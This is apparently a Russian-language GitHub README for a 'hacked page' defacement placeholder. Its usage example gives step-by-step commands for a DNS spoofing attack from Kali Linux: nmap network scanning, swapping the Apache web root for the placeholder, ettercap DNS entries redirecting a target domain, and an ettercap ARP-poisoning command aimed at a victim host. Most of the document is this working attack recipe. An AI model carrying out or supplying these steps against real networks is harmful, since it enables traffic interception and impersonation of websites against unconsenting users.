## Заглушка для хакнутой страницы


[Как это выглядит](https://tarokinoe.github.io/hacked_page/)

### Пример использования:
В данном примере мы подменим страницу какого-нибудь сайта на нашу заглушку с помощью атаки [DNS spoofing] (https://en.wikipedia.org/wiki/DNS_spoofing). Для этого будем использовать [Kali linux](https://www.kali.org/).

Получим ваш ip-адрес
```
ifconfig
```
Пусть это будет 192.168.0.30

Сканируем сеть, чтобы узнать ip шлюза и атакуемого:
```
nmap -sn 192.168.0.0/24
```
Допустим мы получили такой результат:
- 192.168.0.1 - шлюз  
- 192.168.0.20 - адрес атакуемого  
- 192.168.0.30 - ваш ip  
- example.com - домен атакуемого

```
cd /var/www/html/
rm index.html
git clone https://github.com/tarokinoe/hacked_page.git .
service apache2 start
```
/etc/ettercap/etter.dns
```
...
example.com A 192.168.0.30
*.example.com A 192.168.0.30
www.example.com PTR 192.168.0.30
...
```
```
ettercap -T -q -i wlan0 -M arp:remote -P dns_spoof /192.168.0.1// /192.168.0.20//
```
